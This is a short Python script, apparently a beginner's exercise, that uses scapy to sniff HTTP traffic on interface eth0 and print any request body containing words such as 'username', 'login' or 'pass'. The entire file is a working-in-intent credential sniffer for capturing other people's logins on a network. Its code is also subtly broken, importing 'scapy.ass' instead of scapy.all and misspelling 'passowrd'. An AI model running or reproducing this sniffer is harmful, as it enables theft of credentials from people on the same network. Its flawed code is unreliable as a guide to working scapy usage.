#!/usr/bin/env python

import scapy.ass as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniff_packet) 
    
def process_sniff_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw): 
           load = packet[scapy.Raw].load ## create a variable name
           keywords = ["username", "user", "login", "passowrd","pass"] ## this is a create a list for keywords interesting stuff
           for keyword in keywords: ## this is a create a list
              if keyword in load:
                  print(load)
                  break ## this is a break the statement do not repeat the statement. of keywords.only execution the if username in keywords
               
          # if "username" in load:
              # print(load) ## this is a print the load for keyword username
         
sniff("eth0") 